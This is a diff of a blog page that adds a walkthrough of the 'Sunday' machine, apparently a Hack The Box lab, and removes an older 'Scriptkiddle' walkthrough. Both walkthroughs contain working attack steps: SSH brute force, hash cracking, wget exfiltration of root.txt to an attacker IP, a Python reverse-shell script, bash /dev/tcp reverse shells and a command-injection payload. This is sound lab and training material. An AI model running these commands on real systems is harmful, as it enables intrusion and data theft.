@@ -71,6 +71,99 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Sunday" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/07/25/Sunday/" class="article-date">
+  <time class="dt-published" datetime="2022-07-25T09:38:50.000Z" itemprop="datePublished">2022-07-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/07/25/Sunday/">Sunday</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><img src="/2022/07/25/Sunday/nmapscan.png">
+
+<h5 id="finger"><a href="#finger" class="headerlink" title="finger"></a>finger</h5><p>The finger daemon listens on port 79, and is really a relic of a time when computers were far too trusting and open. It provides status reports on logged in users. It can also provide details about a specific user and when they last logged in and from where.<br>we can use <a href>finger-user-enum</a> to brute force it.</p>
+<pre><code>wget http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz
+perl finger-user-enum.pl -U /usr/share/SecLists/Usernames/Names/names.txt -t 10.10.10.76
+######## Scan started at Sun Oct  7 08:57:50 2018 #########
+access@10.10.10.76: access No Access User                     &lt; .  .  .  . &gt;..nobody4  SunOS 4.x NFS Anonym               &lt; .  .  .  . &gt;..
+admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              &lt; .  .  .  . &gt;..lp       Line Printer Admin                 &lt; .  .  .  . &gt;..uucp
+anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
+bin@10.10.10.76: bin             ???                         &lt; .  .  .  . &gt;..
+dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
+jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
+la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
+line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 &lt; .  .  .  . &gt;..
+message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               &lt; .  .  .  . &gt;..
+miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
+sammy@10.10.10.76: sammy                 pts/2        &lt;Apr 24 12:57&gt; 10.10.14.4          ..
+sunny@10.10.10.76: sunny                 pts/3        &lt;Apr 24 10:48&gt; 10.10.14.4          ..
+sys@10.10.10.76: sys             ???                         &lt; .  .  .  . &gt;..
+zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
+######## Scan completed at Sun Oct  7 09:03:50 2018 #########
+14 results.
+</code></pre>
+<p>there are some useless information in it,but sammy and sunny seems useful<br><img src="/2022/07/25/Sunday/useful.png"></p>
+<h4 id="2-get-user-access"><a href="#2-get-user-access" class="headerlink" title="2.get user access"></a>2.get user access</h4><p>with sammy and sunny,we can try to enum password<br>use hydra to brute password<br>    hydra -L user.txt -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -I -f  -s 22022 10.10.10.76 ssh<br>and we will get a cred sunny&#x2F;sunday<br>now we can use ssh to login<br><img src="/2022/07/25/Sunday/user.png"><br>we can execute &#x2F;root&#x2F;troll without password<br>Inside &#x2F;backup there’s a copy of a shadow file that is world readable:<br><img src="/2022/07/25/Sunday/backup.png"><br><img src="/2022/07/25/Sunday/agent22.png"><br><img src="/2022/07/25/Sunday/shadow.png"></p>
+<p>use hashcat to get passwd</p>
+<pre><code>hashcat -m 7400 sunday.hash /usr/share/wordlists/rockyou.txt --force
+</code></pre>
+<img src="/2022/07/25/Sunday/sammy.png">
+and we can login with sammy
+<img src="/2022/07/25/Sunday/sammylogin.png">
+
+<h4 id="3-get-root-access"><a href="#3-get-root-access" class="headerlink" title="3.get root access"></a>3.get root access</h4><p>the first way to get root is to use sammy wget to get root.txt<br><img src="/2022/07/25/Sunday/roottxt.png"></p>
+<h5 id="way-1"><a href="#way-1" class="headerlink" title="way 1"></a>way 1</h5><p>The easiest way to just get the flag is to take advantage of the –input-file or -i flag on wget. This flag allows you to provide a file with the urls to visit. When it reads the hash, the string will fail to process as a url, and will tell us so in an error message, complete with flag:<br><img src="/2022/07/25/Sunday/root1.png"></p>
+<h5 id="way-2"><a href="#way-2" class="headerlink" title="way 2"></a>way 2</h5><p>A second method to exfil the flag is to have wget post the file back to us using <code>--post-file</code>,but python SimpleHTTPServer doesn’t support POST requests<br><img src="/2022/07/25/Sunday/way2.1.png"><br>but in this case,we just need to use nc to get the information<br>    sudo wget –post-file &#x2F;root&#x2F;root.txt <a target="_blank" rel="noopener" href="http://10.10.16.10:8888/">http://10.10.16.10:8888/</a><br><img src="/2022/07/25/Sunday/way2.2.png"></p>
+<h5 id="way-3"><a href="#way-3" class="headerlink" title="way 3"></a>way 3</h5><p>because the sunny can execute troll without password<br>we can try to overwrite this file<br>first write a python script</p>
+<pre><code>#! /bin/bash
+import os
+import socket
+import subprocess
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&quot;10.10.16.10&quot;,8888))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);
+</code></pre>
+<p>using the -O option, which will allow us to specify a file to write the wget output to, and it will overwrite that file if it already exists</p>
+<pre><code>sudo wget http://10.10.16.10/reverse.py -O /root/troll
+</code></pre>
+<p>but this method may fail because the script reset itself per 5 seconds</p>
+<h5 id="way-4"><a href="#way-4" class="headerlink" title="way 4"></a>way 4</h5><p>we can overwrite other files we can execute,such as passwd<br><img src="/2022/07/25/Sunday/way4.png"></p>
+<h5 id="way-5-overwrite-shadow"><a href="#way-5-overwrite-shadow" class="headerlink" title="way 5 overwrite shadow"></a>way 5 overwrite shadow</h5><p>make a root user copied from sunny<br>and get it<br><img src="/2022/07/25/Sunday/way5.1.png"><br><img src="/2022/07/25/Sunday/way5.2.png"></p>
+<h5 id="way-6"><a href="#way-6" class="headerlink" title="way 6"></a>way 6</h5><p>Overwrite sudoers<br>Let’s change that slightly in a copy on our local host, giving sammy the ability to run su without password:<br><img src="/2022/07/25/Sunday/way6.1.png"><br><img src="/2022/07/25/Sunday/way6.2.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/07/25/Sunday/" data-id="cl60o2zry0000brcp0i1c13h2" data-title="Sunday" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-Sense" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/07/24/Sense/" class="article-date">
@@ -700,51 +793,6 @@ we can first see what's configured
 
 
   
-    <article id="post-Scriptkiddle" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/07/14/Scriptkiddle/" class="article-date">
-  <time class="dt-published" datetime="2022-07-15T03:07:06.000Z" itemprop="datePublished">2022-07-14</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/07/14/Scriptkiddle/">Scriptkiddle</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h4 id="1-nmap-scan"><a href="#1-nmap-scan" class="headerlink" title="1.nmap scan"></a>1.nmap scan</h4><p>nmap -sCV –min-rate&#x3D;10000 -p- 10.10.10.226<br><img src="/2022/07/14/Scriptkiddle/nmap.png" width="50%"></p>
-<h4 id="2-site"><a href="#2-site" class="headerlink" title="2.site"></a>2.site</h4><p>in the website,it has three parts<br>the first is nmap moudle,when we type a ip,it will send back the nmap result<br>the payload section allows me to generate a payload after choose ip,os and template file<br>the third part seems like searchspolit moudle</p>
-<h5 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h5><p>when we search msfvenom, we can see it has a exploit before the version 6.0.11<br><img src="/2022/07/14/Scriptkiddle/msfvenom.png" width="50%"><br>we can have a try<br>msfvenom handles an APK template file. The idea of the template file is that you can pass msfvenom a legit .exe or .apk, and it will try to build a malicious file into that file while preserving the intended capability. This functionality allows for attackers to hide behind the legit functionality.</p>
-<h5 id="build-payload"><a href="#build-payload" class="headerlink" title="build payload"></a>build payload</h5><p>we can use searchspolit -m 49491.py to use this<br>change the payload to <code>bash -c &#39;bash -i &gt;&amp;/dev/tcp/10.10.14.15/8888 0&gt;&amp;1&#39;</code> to reverse a shell<br>if the execution get wrong,first use <code>apt-get install openjdk-11-jdk-headless</code> to enable jarsigner<br>or we can use msfconsole to generate an apk,we should change the payload to <code>cmd/unix/reverse_netcat</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use msfconsole</span><br><span class="line">search msfvenom</span><br><span class="line">use 0</span><br><span class="line">set payload cmd/unix/reverse</span><br><span class="line">set lhost xxxx</span><br><span class="line">run</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h5 id="get-webshell"><a href="#get-webshell" class="headerlink" title="get webshell"></a>get webshell</h5><p>and we can upload the apk to the website<br>on the website “payloads” section, select Android for OS and upload the APK file that was generated by MetaSploit<br><img src="/2022/07/14/Scriptkiddle/web.png" width="50%"><br>in the &#x2F;home folder,we can find two users called kid and pwn<br><img src="/2022/07/14/Scriptkiddle/user.png" width="50%"><br>in the pwn’s folder,we can find a script called scanlosers.sh<br><img src="/2022/07/14/Scriptkiddle/scan.png" width="50%"><br>the script’s function is to scan ips written in &#x2F;home&#x2F;kid&#x2F;logs&#x2F;hackers<br>but this script doesn’t deal the input the hackers provides<br>so we can append a reverse shell command into the file<br><code>echo &quot;test ;/bin/bash -c &#39;bash -i &gt;&amp;/dev/tcp/10.10.14.15/8888 0&gt;&amp;1&#39; #”</code><br><img src="/2022/07/14/Scriptkiddle/pwnshell.png" width="50%"><br><img src="/2022/07/14/Scriptkiddle/pwnshell2.png" width="50%"></p>
-<h4 id="3-shell-as-root"><a href="#3-shell-as-root" class="headerlink" title="3.shell as root"></a>3.shell as root</h4><p>in the pwn,it can sudo msfconsole without password<br><img src="/2022/07/14/Scriptkiddle/root1.png" width="50%"><br>and we get the root<br><img src="/2022/07/14/Scriptkiddle/root2.png" width="50%"><br>we can exec command in msf or use <code>/bin/bash -i</code> to change to the root<br><img src="/2022/07/14/Scriptkiddle/root3.png" width="50%"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/07/14/Scriptkiddle/" data-id="cl5v6ykn00008yacphmm062lr" data-title="Scriptkiddle" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -781,6 +829,10 @@ we can first see what's configured
       <ul>
         
           <li>
+            <a href="/2022/07/25/Sunday/">Sunday</a>
+          </li>
+        
+          <li>
             <a href="/2022/07/24/Sense/">Sense</a>
           </li>
         
@@ -794,10 +846,6 @@ we can first see what's configured
         
           <li>
             <a href="/2022/07/19/FriendZone/">FriendZone</a>
-          </li>
-        
-          <li>
-            <a href="/2022/07/18/Delivery/">Delivery</a>
           </li>
         
       </ul>
